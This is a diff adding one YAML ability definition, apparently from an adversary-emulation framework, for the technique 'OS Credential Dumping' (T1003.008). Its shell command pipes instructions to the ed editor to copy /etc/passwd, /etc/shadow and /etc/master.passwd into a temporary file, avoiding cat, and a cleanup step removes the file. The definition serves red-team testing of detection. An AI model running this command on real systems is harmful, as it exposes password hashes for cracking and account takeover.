@@ -1,0 +1,19 @@
+---
+- id: 5f5d7dcb934bdd130759612f38e33f60
+  name: Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat
+  description: 'Dump /etc/passwd, /etc/master.passwd and /etc/shadow using ed
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1003.008
+    name: 'OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow'
+  platforms:
+    linux:
+      sh:
+        command: unamestr=$(uname); if [ "$unamestr" = 'Linux' ]; then echo -e "e
+          /etc/passwd\n,p\ne /etc/shadow\n,p\n" | ed > /tmp/T1003.008.txt; elif [
+          "$unamestr" = 'FreeBSD' ]; then echo -e "e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne
+          /etc/shadow\n,p\n" | ed > /tmp/T1003.008.txt; fi
+        payloads: []
+        cleanup: rm -f /tmp/T1003.008.txt
